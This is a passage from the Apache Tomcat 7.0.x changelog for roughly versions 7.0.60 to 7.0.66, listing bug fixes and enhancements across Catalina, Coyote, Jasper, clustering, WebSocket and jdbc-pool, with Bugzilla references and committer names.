expressions in attributes on a JSP page (chapter JSP.1.6 of specification). The setting name is `quoteAttributeEL` and it is configured as initialisation parameter of JSP Servlet (per web application configuration is possible) and as a command line option for JspC. The default value was changed to `true`, which restores behaviour implemented in Tomcat 7.0.64. It means that attribute quoting is applied on top of EL quoting. This provides better compatibility with older versions of Tomcat and other implementations. (kkolinko) | | --- | --- | |  | **Cluster** | | --- | | | fix | Optimize the session lock range in DeltaManager.requestCompleted. (kfujino) | | --- | --- | | fix | Enable an explicit configuration of local member in the static cluster membership. (kfujino) | | fix | Fix potential integer overflow in `DeltaSession`. Reported by coverity scan. (fschumacher) | |  | **Tribes** | | --- | | | code | Distinguish the handling of the shutdown payload and member verification clearly. When handling shutdown payload, verification completion message is not required. (kfujino) | | --- | --- | | fix | When starting the `StaticMembershipInterceptor`, `StaticMembershipInterceptor` checks the required Interceptors. If the required Interceptor does not exist, it issues warning logs. (kfujino) | | fix | Ensure that the static member is registered to the add suspect list even if the static member that is registered to the remove suspect list has disappeared. (kfujino) | | fix | Correct the warning log of when the member that is not registered in the membership is detected. (kfujino) | | fix | When using a static cluster, add the members that have been cached in the membership service to the map members list in order to ensure that the map member is a static member. (kfujino) | |  | **WebSocket** | | --- | | | fix | Use instance manager for server endpoint instances. (remm) | | --- | --- | | add | [55006](https://bz.apache.org/bugzilla/show_bug.cgi?id=55006): The WebSocket client now honors the `java.net.java.net.ProxySelector` configuration (using the HTTP type) when establishing WebSocket connections to servers. Based on a patch by Niki Dokovski. (markt) | | fix | [58624](https://bz.apache.org/bugzilla/show_bug.cgi?id=58624): Correct a thread safety issue that meant that blocking message writes could block indefinitely if the WebSocket connection was closed while a message write was in progress. (markt) | |  | **Web applications** | | --- | | | add | Make it clear in the documentation for the CGI servlet that the debug page is not considered secure and should not be used in production. (markt) | | --- | --- | | fix | The `domain` attribute of `StaticMember` is not required but optional. (kfujino) | | fix | [58631](https://bz.apache.org/bugzilla/show_bug.cgi?id=58631): Correct the continuation character use in the Windows Service How-To page of the documentation web application. (markt) | |  | **jdbc-pool** | | --- | | | fix | [58489](https://bz.apache.org/bugzilla/show_bug.cgi?id=58489): Correct QueryStatsComparator to hold up the general contract for Comparator. (fschumacher) | | --- | --- | | fix | When creating a `QueryStats` object, ensure that `maxQueries` is checked. If `maxQueries` is a value less than or equal to 0, `QueryStats` are never created. (kfujino) | | fix | Fix potential integer overflow in `ConnectionPool` and `PooledConnection`. Reported by coverity scan. (fschumacher) | | | |  | **Tomcat 7.0.65 (violetagg)** | **released 2015-10-19** | | --- | --- | | | **Catalina** | | --- | | | add | [57681](https://bz.apache.org/bugzilla/show_bug.cgi?id=57681): Add a web application class loader implementation that supports the parallel loading of web application classes. Use of this feature requires a Java 7 or later JRE. Based on a patch by Huxing Zhang. (markt) | | --- | --- | | fix | [58187](https://bz.apache.org/bugzilla/show_bug.cgi?id=58187): Correct a regression in the fix for [57765](https://bz.apache.org/bugzilla/show_bug.cgi?id=57765) that meant that deployment of web applications deployed via the Manager application was delayed until the next execution of the automatic deployment background process. (markt) | | fix | [58284](https://bz.apache.org/bugzilla/show_bug.cgi?id=58284): Correctly implement session serialization so non-serializable attributes are skipped with a warning. Patch provided by Andrew Shore. (markt) | | fix | [58313](https://bz.apache.org/bugzilla/show_bug.cgi?id=58313): Fix concurrent access of encoders map when clearing encoders prior to switch to async. (markt) | | fix | [58320](https://bz.apache.org/bugzilla/show_bug.cgi?id=58320): Fix concurrent access of request attributes which is possible during asynchronous processing. (markt) | | code | In preparation for implementing enhancement [57681](https://bz.apache.org/bugzilla/show_bug.cgi?id=57681), replace the use of the `StandardClassLoader` with `URLClassLoader`. This removes the server class loader from JMX. (markt) | | fix | [58352](https://bz.apache.org/bugzilla/show_bug.cgi?id=58352): Always trigger a thread dump if Tomcat fails to stop gracefully from `catalina.sh` even if using `-force`. Patch provided by Alexandre Garnier. (markt) | | fix | [58416](https://bz.apache.org/bugzilla/show_bug.cgi?id=58416): Correctly detect when a forced stop fails to stop Tomcat because the Tomcat process is waiting on some system call or is uninterruptible. (markt) | | fix | [58436](https://bz.apache.org/bugzilla/show_bug.cgi?id=58436): Fix some rare data races in JULI's `ClassLoaderLogManager` during shutdown. (markt) | |  | **Coyote** | | --- | | | fix | Correct some edge cases in `RequestUtil.normalize()`. (markt) | | --- | --- | | fix | [58275](https://bz.apache.org/bugzilla/show_bug.cgi?id=58275): The IBM JREs accept cipher suite names starting with `TLS_` or `SSL_` but when listing the supported cipher suites only the `SSL_` version is reported. This can break Tomcat's check that at least one requested cipher suite is supported. Tomcat now includes a work-around so either form of the cipher suite name can be used when running on an IBM JRE. (markt) | | fix | [58357](https://bz.apache.org/bugzilla/show_bug.cgi?id=58357): For reasons not currently understood when the APR/native connector is used with OpenSSL reads can return an error code when there is no apparent error. This was work-around for HTTP upgrade connections by treating this as `EAGAIN`. The same fix has now been applied to the standard HTTP connector. (markt) | | fix | [57799](https://bz.apache.org/bugzilla/show_bug.cgi?id=57799): Remove useless sendfile check for NIO SSL. (remm) | |  | **Jasper** | | --- | | | fix | [57136](https://bz.apache.org/bugzilla/show_bug.cgi?id=57136): Correct a regression in the previous fix for this issue. `\${` should only be an escape for `${` within an EL expression. Within a JSP page `\$` should be an escape for `$`. The EL specification applies when parsing the expression delimited by `${` and `}`. Parsing of the delimiting `${` and `}` is the responsibility of the JSP specification. (markt) | | --- | --- | | fix | [58296](https://bz.apache.org/bugzilla/show_bug.cgi?id=58296): Fix a memory leak in the JSP unloading feature that meant that using a value other than `-1` for `maxLoadedJsps` triggered a memory leak once the limit was reached. (markt) | | fix | [58340](https://bz.apache.org/bugzilla/show_bug.cgi?id=58340): Improve error reporting for tag files packaged in JARs. (markt) | | fix | [58444](https://bz.apache.org/bugzilla/show_bug.cgi?id=58444): Ensure that JSPs work with any custom base class that meets the requirements defined in the JSP specification without requiring that base class to implement Tomcat specific code. (markt) | |  | **Cluster** | | --- | | | fix | Fix a default clusterListeners in `SimpleTcpCluster`. The optimal default value is different for each session manager. `ClusterSessionListener` is never used in `BackupManager`. (kfujino) | | --- | --- | | fix | Correct log messages in case of using `BackupManager`. (kfujino) | |  | **WebSocket** | | --- | | | fix | [58342](https://bz.apache.org/bugzilla/show_bug.cgi?id=58342): Fix a copy and paste error that meant MessageHandler removal could fail for binary and pong MessageHandlers. Patch provided by DJ. (markt) | | --- | --- | | fix | [58414](https://bz.apache.org/bugzilla/show_bug.cgi?id=58414): Correctly handle sending zero length messages when using per message deflate. (markt) | |  | **Web applications** | | --- | | | fix | Correct documentation for cluster-howto. (kfujino) | | --- | --- | |  | **Extras** | | --- | | | fix | Ensure JULI adapters does not include the LogFactoryImpl class. Patch provided by Benjamin Gandon. (markt) | | --- | --- | |  | **Tribes** | | --- | | | add | Add support for configurations of `ChannelListener` and `MembershipListener` in server.xml. (kfujino) | | --- | --- | | fix | Correct log messages in case of using `ReplicatedMap`. (kfujino) | |  | **jdbc-pool** | | --- | | | fix | Make sure the pool has been properly configured when attributes that related to the pool size are changed via JMX. (kfujino) | | --- | --- | | | |  | **Tomcat 7.0.64 (violetagg)** | **released 2015-08-25** | | --- | --- | | | **Catalina** | | --- | | | add | [55317](https://bz.apache.org/bugzilla/show_bug.cgi?id=55317): Facilitate weaving by allowing ClassFileTransformer to be added to WebappClassLoader. Patch by Nick Williams. (markt) | | --- | --- | | fix | [58031](https://bz.apache.org/bugzilla/show_bug.cgi?id=58031): Make the (first) reason parameter parsing failed available as a request attribute and then use it to provide a better status code via the FailedRequstFilter (if configured). (markt) | | fix | [58086](https://bz.apache.org/bugzilla/show_bug.cgi?id=58086): Ensure that WAR URLs are handled properly when using Apache Ant for web application deployment. (violetagg) | | fix | [58094](https://bz.apache.org/bugzilla/show_bug.cgi?id=58094): Fix cosmetic error log when using non standard non cacheable resources, like with the empty resources used in some tests. (remm) | | fix | [58096](https://bz.apache.org/bugzilla/show_bug.cgi?id=58096): Classes loaded from `/WEB-INF/classes/` should use that directory as their code base. (markt) | | fix | Fix possible resource leaks by closing streams properly. Issues reported by Coverity Scan. (violetagg) | | fix | [58116](https://bz.apache.org/bugzilla/show_bug.cgi?id=58116): Fix a regression in the fix for [57281](https://bz.apache.org/bugzilla/show_bug.cgi?id=57281) that broke Comet support when running under a security manager. Based on a patch provided by Johno Crawford. (markt) | | fix | [58179](https://bz.apache.org/bugzilla/show_bug.cgi?id=58179): Fix a thread safety issues that could mean concurrent threads setting the same attribute on a `ServletContext` could both see `null` as the old value. (markt) | | fix | [58192](https://bz.apache.org/bugzilla/show_bug.cgi?id=58192): Correct a regression in the previous fix for [58023](https://bz.apache.org/bugzilla/show_bug.cgi?id=58023). Ensure that classes are associated with their manifest even if the class file is first read (and cached) without the manifest. (markt) | | fix | Fix thread safety issue in the `AsyncContext` implementation that meant a sequence of `start();dispatch();` calls using non-container threads could result in a previous dispatch interfering with a subsequent start. (markt) | |  | **Coyote** | | --- | | | fix | [57943](https://bz.apache.org/bugzilla/show_bug.cgi?id=57943): Prevent the same socket being added to the cache twice. Patch based on analysis by Ian Luo / Sun Qi. (markt) | | --- | --- | | fix | Add `text/javascript,application/javascript` to the default list of compressable MIME types. (violetagg) | | fix | [58103](https://bz.apache.org/bugzilla/show_bug.cgi?id=58103): When pipelining requests, and the previous request was an async request, ensure that the socket is removed from the waiting requests so that the async timeout thread doesn't process it during the next request. (markt) | | fix | Fix a concurrency issue that meant that a change in socket timeout (e.g. when switching to asynchronous I/O) did not always take effect immediately. (markt) | | fix | In the AJP and HTTP NIO connectors, ensure that the socket timeout is correctly set before adding the socket back to the poller for read. (markt) | | fix | [58157](https://bz.apache.org/bugzilla/show_bug.cgi?id=58157): Ensure that the handling of async timeouts does not result in an unnecessary dispatch to a container thread that could result in the current socket being added to the Poller multiple times with multiple attempts to process the same event for the same socket. (markt) | | fix | Correct a couple of edge cases in `RequestUtil.normalize()`. (markt) | |  | **Jasper** | | --- | | | fix | [58110](https://bz.apache.org/bugzilla/show_bug.cgi?id=58110): Like scriptlet sections, declaration sections of JSP pages have a one-to-one mapping of lines to the generated .java file. Use this information to provide more accurate error messages if a compilation error occurs in a declaration section. (markt) | | --- | --- | | fix | [58119](https://bz.apache.org/bugzilla/show_bug.cgi?id=58119): When tags are compiled they must be placed in the org/apache/jsp/tag/web directory. Correct a regression in the fix for 52725. (violetagg) | | fix | [58178](https://bz.apache.org/bugzilla/show_bug.cgi?id=58178): Expressions in a tag file should use the tag file's `PageContext` rather than that of the containing page. (markt) | |  | **WebSocket** | | --- | | | fix | [58166](https://bz.apache.org/bugzilla/show_bug.cgi?id=58166): Allow applications to send close codes in the range 3000-4999 inclusive. (markt) | | --- | --- | | fix | [58232](https://bz.apache.org/bugzilla/show_bug.cgi?id=58232): Avoid possible NPE when adding endpoints programmatically to the `javax.websocket.server.ServerContainer`. Based on a patch provided by bastian.(violetagg) | |  | **Web applications** | | --- | | | fix | Correct the incorrect document of `QueryTimeoutInterceptor`. The setting value is not in milliseconds but in seconds. (kfujino) | | --- | --- | | fix | [58112](https://bz.apache.org/bugzilla/show_bug.cgi?id=58112): Update the documentation for using the Catalina tasks in an Apache Ant build file. (markt) | | fix | Improve the Javadoc for some of the APR socket read functions that have inconsistent behaviour for return values. (markt) | | add | [58255](https://bz.apache.org/bugzilla/show_bug.cgi?id=58255): Document the Semaphore valve. Patch provided by Kyohei Nakamura. (markt) | |  | **jdbc-pool** | | --- | | | fix | Fix potential NPE in `QueryTimeoutInterceptor`. (kfujino) | | --- | --- | | fix | Add support for stopping the pool cleaner via JMX. (kfujino) | | fix | The `fairness` attribute and `ignoreExceptionOnPreLoad` attribute do not allow a change via JMX. (kfujino) | | fix | If the `timeBetweenEvictionRunsMillis` attribute is changed via jmx, it should restart the pool cleaner because this attribute affects the execution interval of the pool cleaner. (kfujino) | | fix | Eliminate the dependence on `maxActive` of busy queues and idle queue in order to enable the expansion of the pool size via JMX. (kfujino) | |  | **Other** | | --- | | | fix | Update sample Eclipse IDE configuration to exclude test/webapp\* and similar paths from compiler sourcepath. (kkolinko) | | --- | --- | | | |  | **Tomcat 7.0.63 (violetagg)** | **released 2015-07-06** | | --- | --- | | | **Catalina** | | --- | | | fix | [57938](https://bz.apache.org/bugzilla/show_bug.cgi?id=57938): Correctly handle empty form fields when a form is submitted as `multipart/form-data`, the `maxPostSize` attribute of the Connector has been set to a negative value and the Context has been configured with a value of `true` for `allowCasualMultipartParsing`. The meaning of the value zero for the `maxPostSize` has also been changed to mean a limit of zero rather than no limit to align it with `maxSavePostSize` and to be more intuitive. (markt) | | --- | --- | | add | [54618](https://bz.apache.org/bugzilla/show_bug.cgi?id=54618): Add a new `HttpHeaderSecurityFilter` that adds the `Strict-Transport-Security`, `X-Frame-Options` and `X-Content-Type-Options` HTTP headers to the response. (markt) | | fix | Add a workaround for issues with SPNEGO authentication when running on Java 8 update 40 and later. The workaround should be safe for earlier Java versions but it can be disabled with the `applyJava8u40Fix` attribute of the SPNEGO authenticator if necessary. (markt) | | add | [57154](https://bz.apache.org/bugzilla/show_bug.cgi?id=57154): Add support for web applications (Context elements) that do not have a docBase. This is primarily for use when embedding but it also fixes a rare issue when running the unit test. Patch provided by Huxing Zhang. (markt) | | fix | [57959](https://bz.apache.org/bugzilla/show_bug.cgi?id=57959): Fixed deadlock in `org.apache.juli.FileHandler` when log is rotated. (violetagg) | | fix | [57977](https://bz.apache.org/bugzilla/show_bug.cgi?id=57977): Correctly bind and unbind the web application class loader during execution of the PersistentValve. (markt) | | fix | [58023](https://bz.apache.org/bugzilla/show_bug.cgi?id=58023): Fix potentially excessive memory usage due to unnecessary caching of JAR manifests in the web application class loader. (markt) | | fix | [57700](https://bz.apache.org/bugzilla/show_bug.cgi?id=57700): Ensure that Container event `ADD_CHILD_EVENT` will be sent in all cases. (violetagg) | | fix | Add configuration fields for header names in SSLValve. (remm) | |  | **Coyote** | | --- | | | fix | [57265](https://bz.apache.org/bugzilla/show_bug.cgi?id=57265): Further fix to address a potential threading issue for NIO when sendfile is used in conjunction with TLS. (markt) | | --- | --- | | fix | [57931](https://bz.apache.org/bugzilla/show_bug.cgi?id=57931): Ensure that TLS connections with the NIO HTTP connector that experience issues during the handshake (e.g. missing or invalid client certificate) are closed cleanly and that the client receives the correct error code rather than simply closing the connection. (markt) | | add | [57943](https://bz.apache.org/bugzilla/show_bug.cgi?id=57943): Added a work-around to catch `ConcurrentModificationException`s during Poller timeout processing that were causing the Poller thread to stop. The root cause of these exceptions is currently unknown. (markt) | | fix | Fix possible very long (1000 seconds) timeout with APR/native connector. (markt) | | add | Support "-" separator in the SSLProtocol configuration of the APR/native connector for protocol exclusion. (rjung) | |  | **Cluster** | | --- | | | fix | Make sure that stream is closed after using it in `DeltaSession.applyDiff()`. (kfujino) | | --- | --- | |  | **WebSocket** | | --- | | | add | [57676](https://bz.apache.org/bugzilla/show_bug.cgi?id=57676): List conflicting WebSocket endpoint classes when there is a path conflict. Based upon a patch proposed by yangkun. (schultz) | | --- | --- | | add | Extend support for the `permessage-deflate` extension to the client implementation. | | fix | [57969](https://bz.apache.org/bugzilla/show_bug.cgi?id=57969): Provide path parameters to POJO via per session `javax.websocket.server.ServerEndpointConfig` as they vary between different requests. (violetagg) | | fix | [57974](https://bz.apache.org/bugzilla/show_bug.cgi?id=57974): Session.getOpenSessions should return all sessions associated with a given endpoint instance, rather than all sessions from the endpoint class. (remm) | |  | **Web applications** | | --- | | | fix | [57282](https://bz.apache.org/bugzilla/show_bug.cgi?id=57282): Update request processing sequence diagrams. Updated diagrams provided by Stephen Chen. (markt) | | --- | --- | | fix | [57971](https://bz.apache.org/bugzilla/show_bug.cgi?id=57971): Correct the documentation for the cluster configuration setting `recoverySleepTime`. (markt) | | add | [57758](https://bz.apache.org/bugzilla/show_bug.cgi?id=57758): Add document of `testOnConnect` attribute in jdbc-pool doc. (kfujino) | | add | Add description of `validatorClassName` attribute to testXXXX attributes in jdbc-pool docs. (kfujino) | |  | **Tribes** | | --- | | | fix | Ensure that the state transfer flag is updated to true only when the map states have been transferred correctly from existing map members. (kfujino) | | --- | --- | | fix | Do not set the nodes that failed to replication to the backup nodes. Ensure that the nodes that the data has been successfully replicated are set to the backup node. (kfujino) | | fix | When failed to replication, rather than all member is handled as a failed member, exclude the failure members from backup members. (kfujino) | |  | **jdbc-pool** | | --- | | | fix | Refactoring of the `removeOldest` method in `SlowQueryReport` to behave as expected. (kfujino) | | --- | --- | | fix | [57783](https://bz.apache.org/bugzilla/show_bug.cgi?id=57783): Fix `NullPointerException` in `SlowQueryReport`. To avoid this NPE, Refactor `SlowQueryReport#removeOldest` and handle the abandoned connection properly. (kfujino) | |  | **Other** | | --- | | | update | Update package renamed Apache Commons BCEL to r1682271 to pick up some some code clean up. (markt) | | --- | --- | | update | Update package renamed Apache Commons File upload to r1682322 to pick up the post 1.3.1 fixes. (markt) | | update | Update package renamed Apache Commons Codec to r1682326. No functional changes. Javadoc only. (markt) | | | |  | **Tomcat 7.0.62 (violetagg)** | **released 2015-05-14** | | --- | --- | | | **Catalina** | | --- | | | add | Allow logging of the remote port in the access log using the format pattern `%{remote}p`. (rjung) | | --- | --- | | fix | [57765](https://bz.apache.org/bugzilla/show_bug.cgi?id=57765): When checking last modified times as part of the automatic deployment process, account for the fact that `File.lastModified()` has a resolution of one second to ensure that if a file has been modified within the last second, the latest version of the file is always used. Note that a side-effect of this change is that files with modification times in the future are treated as if they are unmodified. (markt) | | fix | Align redeploy resource modification checking with reload modification checking so that now, in both cases, a change in modification time rather than an increase in modification time is used to determine if the resource has changed. (markt) | | fix | Cleanup `o.a.tomcat.util.digester.Digester` from debug messages that do not give any valuable information. Patch provided by Polina Genova. (violetagg) | | fix | [57772](https://bz.apache.org/bugzilla/show_bug.cgi?id=57772): When reloading a web application and a directory representing an expanded WAR needs to be deleted, delete the directory after the web application has been stopped rather than before to avoid potential ClassNotFoundExceptions. (markt) | | fix | [57801](https://bz.apache.org/bugzilla/show_bug.cgi?id=57801): Improve the error message in the start script in case the PID read from the PID file is already owned by a process. (rjung) | | fix | [57824](https://bz.apache.org/bugzilla/show_bug.cgi?id=57824): Correct a regression in the fix for [57252](https://bz.apache.org/bugzilla/show_bug.cgi?id=57252) that broke request listeners for non-async requests that triggered an error that was handled by the ErrorReportingValve. (markt/violetagg) | | fix | [57841](https://bz.apache.org/bugzilla/show_bug.cgi?id=57841): Improve error logging during web application start. (markt) | | fix | [57856](https://bz.apache.org/bugzilla/show_bug.cgi?id=57856): Ensure that any scheme/port changes implemented by the `RemoteIpFilter` also affect `HttpServletResponse.sendRedirect()`. (markt) | | fix | [57896](https://bz.apache.org/bugzilla/show_bug.cgi?id=57896): Support defensive copying of "cookie" header so that unescaping double quotes in a cookie value does not corrupt original value of "cookie" header. This is an opt-in feature, enabled by `org.apache.tomcat.util.http.ServerCookie.PRESERVE_COOKIE_HEADER` or `org.apache.catalina.STRICT_SERVLET_COMPLIANCE` system property. (kkolinko) | |  | **Coyote** | | --- | | | fix | [57779](https://bz.apache.org/bugzilla/show_bug.cgi?id=57779): When an I/O error occurs on a non-container thread only dispatch to a container thread to handle the error if using Servlet 3+ asynchronous processing. This avoids potential deadlocks if an application is performing I/O on a non-container thread without using the Servlet 3+ asynchronous API. (markt) | | --- | --- | | fix | [57833](https://bz.apache.org/bugzilla/show_bug.cgi?id=57833): When using JKS based keystores for NIO, ensure that the key alias is always converted to lower case since that is what JKS key stores expect. Based on a patch by Santosh Giri Govind M. (markt) | | fix | [57837](https://bz.apache.org/bugzilla/show_bug.cgi?id=57837): Add `text/css` to the default list of compressable MIME types. (markt) | |  | **Jasper** | | --- | | | fix | [57845](https://bz.apache.org/bugzilla/show_bug.cgi?id=57845): Ensure that, if the same JSP is accessed directly and via a `<jsp-file>` declaration in web.xml, updates to the JSP are visible (subject to the normal rules on re-compilation) regardless of how the JSP is accessed. (markt) | | --- | --- | | fix | [57855](https://bz.apache.org/bugzilla/show_bug.cgi?id=57855): Explicitly handle the case where a `MethodExpression` is invoked with null or the wrong number of parameters. Rather than failing with an `ArrayIndexOutOfBoundsException` or a `NullPointerException` throw an `IllegalArgumentException` with a useful error message. (markt) | |  | **Cluster** | | --- | | | add | Add new attribute that send all actions for session across Tomcat cluster nodes. (kfujino) | | --- | --- | | fix | Remove unused `pathname` attribute in mbean definition of `BackupManager`. (kfujino) | | fix | [57338](https://bz.apache.org/bugzilla/show_bug.cgi?id=57338): Improve the ability of the ClusterSingleSignOn valve to handle nodes being added and removed from the Cluster at run time. (markt) | | fix | Avoid unnecessary call of `DeltaRequest.addSessionListener()` in non-primary nodes. (kfujino) | |  | **WebSocket** | | --- | | | fix | [57762](https://bz.apache.org/bugzilla/show_bug.cgi?id=57762): Ensure that the WebSocket client correctly detects when the connection to the server is dropped. (markt) | | --- | --- | | fix | [57776](https://bz.apache.org/bugzilla/show_bug.cgi?id=57776): Revert the 8.0.21 fix for the `permessage-deflate` implementation and incorrect op-codes since the fix was unnecessary (the bug only affected trunk) and the fix broke rather than fixed `permessage-deflate` if an uncompressed message was converted into more than one compressed message. (markt) | | fix | Fix log name typo in `WsRemoteEndpointImplServer` class, caused by a copy-paste. (markt/kkolinko) | | fix | [57788](https://bz.apache.org/bugzilla/show_bug.cgi?id=57788): Avoid NPE when looking up a class hierarchy without finding anything. (remm) | | add | Make WebSocket client more robust when handling errors during the close of a WebSocket session. (markt) | |  | **Web applications** | | --- | | | add | [57759](https://bz.apache.org/bugzilla/show_bug.cgi?id=57759): Add information to the keyAlias documentation to make it clear that the order keys are read from the keystore is implementation dependent. (markt) | | --- | --- | | fix | [57864](https://bz.apache.org/bugzilla/show_bug.cgi?id=57864): Update the documentation web application to make it clearer that hex values are not valid for cluster send options. Based on a patch by Kyohei Nakamura. (markt) | |  | **Tribes** | | --- | | | fix | Fix a concurrency issue when a backup message that has all session data and a backup message that has diff data are processing at the same time. This fix ensures that `MapOwner` is set to `ReplicatedMapEntry`. (kfujino) | | --- | --- | | fix | Clarify the handling of Copy message and Copy nodes. (kfujino) | | fix | Copy node does not need to send the entry data. It is enough to send only the node information of the entry. (kfujino) | | fix | `ReplicatedMap` should send the Copy message when replicating. (kfujino) | | fix | Fix behavior of `ReplicatedMap` when member has disappeared. If map entry is primary, rebuild the backup members. If primary node of map entry has disappeared, backup node is promoted to primary. (kfujino) | | fix | When a map member has been added to `ReplicatedMap`, make sure to add it to backup nodes list of all other members. (kfujino) | | | |  | **Tomcat 7.0.61 (violetagg)** | **released 2015-04-07** | | --- | --- | | | **Catalina** | | --- | | | fix | [55988](https://bz.apache.org/bugzilla/show_bug.cgi?id=55988): Correct the check used for Java 8 JSSE server-preferred TLS cipher suite ordering. Ensure that SSL parameters are provided to `SSLServerSocket` and `SSLEngine`. Patch provided by Ognjen Blagojevic. (violetagg) | | --- | --- | |  | **WebSocket** | | --- | | | fix | [57761](https://bz.apache.org/bugzilla/show_bug.cgi?id=57761): Ensure that the opening HTTP request is correctly formatted when the WebSocket client connects to a server root. (remm) | | --- | --- | | | |  | **Tomcat 7.0.60 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Clarify threaded usage of variables by removing volatile marker in NonceInfo. Issue reported by Coverity Scan. (fschumacher) | | --- | --- | | add | [49785](https://bz.apache.org/bugzilla/show_bug.cgi?id=49785): Enable StartTLS connections for JNDIRealm. (fschumacher) | | fix | [55988](https://bz.apache.org/bugzilla/show_bug.cgi?id=55988): Add support for Java 8 JSSE server-preferred TLS cipher suite ordering. This feature requires Java 8 and is controlled by `useServerCipherSuitesOrder` attribute on an HTTP connector. Based upon patches provided by Ognjen Blagojevic. (schultz) | | add | [56438](https://bz.apache.org/bugzilla/show_bug.cgi?id=56438): Add logging that reports when a JAR is scanned for TLDs but nothing is found so that Tomcat may be configured to skip this JAR in future. Based on a patch by VIN. (markt) | | fix | [56848](https://bz.apache.org/bugzilla/show_bug.cgi?id=56848): Use `Locale.forLanguageTag` to process Locale headers when running on a Java 7 or later JRE. (markt) | | add | [57021](https://bz.apache.org/bugzilla/show_bug.cgi?id=57021): Improve logging in AprLifecycleListener and jni.Library when Tomcat-Native DLL fails to load. Based on a patch by Pravallika Peddi. (markt/kkolinko) | | fix | [57180](https://bz.apache.org/bugzilla/show_bug.cgi?id=57180): Further fixes to support the use of arbitrary HTTP methods with the CORS filter. (markt) | | add | Warn about problematic setting of appBase. (fschumacher) | | fix | [57534](https://bz.apache.org/bugzilla/show_bug.cgi?id=57534): CORS Filter should only look at media type component of Content-Type request header. (markt) | | fix | Ensure that user name checking in the optional SecurityListener is case-insensitive (as documented) and than the case-insensitive comparison is performed using the system default Locale. (markt) | | fix | When docBase refers internal war and unpackWARs is set to false, avoid registration of the invalid redeploy resource that has been added ".war" extension in duplicate. (kfujino) | | fix | If WAR exists, it is not necessary to trigger a reload when adding a Directory. (kfujino) | | fix | [56608](https://bz.apache.org/bugzilla/show_bug.cgi?id=56608): When deploying an external WAR, add watched resources in the expanded directory based on whether the expanded directory is expected to exist rather than if it does exist. | | fix | When triggering a reload due to a modified watched resource, ensure that multiple changed watched resources only trigger one reload rather than a series of reloads. | | fix | [57601](https://bz.apache.org/bugzilla/show_bug.cgi?id=57601): Ensure that HEAD requests return the correct content length (i.e. the same as for a GET) when the requested resource includes a resource served by the Default servlet. (jboynes/markt) | | fix | [57602](https://bz.apache.org/bugzilla/show_bug.cgi?id=57602): Ensure that HEAD requests return the correct content length (i.e. the same as for a GET) when the requested resource includes a resource served by a servlet that extends `HttpServlet`. (markt) | | fix | [57621](https://bz.apache.org/bugzilla/show_bug.cgi?id=57621): When an async request completes, ensure that any remaining request body data is swallowed. (markt) | | fix | [57637](https://bz.apache.org/bugzilla/show_bug.cgi?id=57637): Do not create unnecessary sessions when using PersistentValve. (jboynes/fschumacher) | | fix | [57645](https://bz.apache.org/bugzilla/show_bug.cgi?id=57645): Correct a regression in the fix for [57190](https://bz.apache.org/bugzilla/show_bug.cgi?id=57190) that incorrectly required the path passed to `ServletContext.getContext(String)` to be an exact match to a path to an existing context. (markt) | | fix | Make sure that `unpackWAR` attribute of `Context` is handled correctly in `HostConfig`. (kfujino) | | fix | When deploying a WAR file that contains a context.xml file and `unpackWARs` is `false` ignore any context.xml file that may exist in an expanded directory associated with the WAR. (markt) | | fix | [57675](https://bz.apache.org/bugzilla/show_bug.cgi?id=57675): Correctly quote strings when using the extended access log. (markt) | | fix | [57704](https://bz.apache.org/bugzilla/show_bug.cgi?id=57704): Fix potential NPEs during web application start/stop when `org.apache.tomcat.InstanceManager` is not initialized. (violetagg) | | fix | Add support for `LAST_ACCESS_AT_START` system property to `SingleSignOn`. (kfujino) | | fix | [57723](https://bz.apache.org/bugzilla/show_bug.cgi?id=57723): Ensure that the Context name and path remain consistent when adding a web application to an embedded Tomcat instance via `Tomcat.addWebapp(Host,String,String,String)`. (markt) | | fix | [57724](https://bz.apache.org/bugzilla/show_bug.cgi?id=57724): Handle the case in the CORS filter where a user agent includes an origin header for a non-CORS request. (markt) | | code | Refactor Authenticator implementations to reduce code duplication. (markt) | | fix | When searching for SCIs `o.a.catalina.Context.getParentClassLoader` will be used instead of `java.lang.ClassLoader.getParent`. Thus one can provide the correct parent class loader when running embedded Tomcat in other environments such as OSGi. (violetagg) | |  | **Coyote** | | --- | | | fix | [57509](https://bz.apache.org/bugzilla/show_bug.cgi?id=57509): Improve length check when writing HTTP/1.1 response headers: reserve space for 4 extra bytes. (kkolinko) | | --- | --- | | add | [57540](https://bz.apache.org/bugzilla/show_bug.cgi?id=57540): Make TLS/SSL protocol available in a new request attribute (`org.apache.tomcat.util.net.secure_protocol_version`). (Note that AJP connectors will require mod\_jk 1.2.41 or later, or an as-yet-unknown version of mod\_proxy\_ajp, or configure the proxy to send the AJP\_SSL\_PROTOCOL request attribute to Tomcat. Please see the bug comments for details.) Based upon a patch provided by Ralf Hauser. (schultz) | | fix | [57544](https://bz.apache.org/bugzilla/show_bug.cgi?id=57544): Fix potential infinite loop when preparing a kept alive HTTP connection for the next request. (markt) | | fix | [57546](https://bz.apache.org/bugzilla/show_bug.cgi?id=57546): Ensure that a dropped network connection does not leave references to the UpgradeProcessor associated with the connection in memory. (markt) | | fix | [57570](https://bz.apache.org/bugzilla/show_bug.cgi?id=57570): Make the processing of trailer headers with chunked input optional and disabled by default. (markt) | | fix | When applying the `maxSwallowSize` limit to a connection read that many bytes first before closing the connection to give the client a chance to read the response. (markt) | | fix | Prevent an async timeout being processed multiple times for the same socket when running on slow and/or heavily loaded systems. (markt) | | fix | [57581](https://bz.apache.org/bugzilla/show_bug.cgi?id=57581): Change statistics byte counter in coyote Request object to be long to allow values above 2Gb. (kkolinko) | | fix | Fix a concurrency issue in the APR Poller that meant it was possible under low load for a socket queued to be added to the Poller not to be added for 10 seconds. (markt) | | fix | [57638](https://bz.apache.org/bugzilla/show_bug.cgi?id=57638): Avoid an IllegalArgumentException when an AJP request body chunk larger than the socket read buffer is being read. This typically requires a larger than default AJP packetSize. (markt) | | fix | [57674](https://bz.apache.org/bugzilla/show_bug.cgi?id=57674): Avoid a BufferOverflowException when an AJP response body chunk larger than the socket write buffer is being written. This typically requires a larger than default AJP packetSize. (markt) | | code | Refactor Connector authentication (only used by AJP) into a separate method. (markt) | | add | [57708](https://bz.apache.org/bugzilla/show_bug.cgi?id=57708): Implement a new feature for AJP connectors - Tomcat Authorization. If the new tomcatAuthorization attribute is set to `true` (it is disabled by default) Tomcat will take an authenticated user name from the AJP protocol and use the appropriate Realm for the request to authorize (i.e. add roles) to that user. (markt) | | fix | Fix an issue that meant that any pipe-lined data read by Tomcat before an asynchronous request completed was lost during the completion of the asynchronous request. This mean that the pipe-lined request(s) would be lost and/or corrupted. (markt) | | 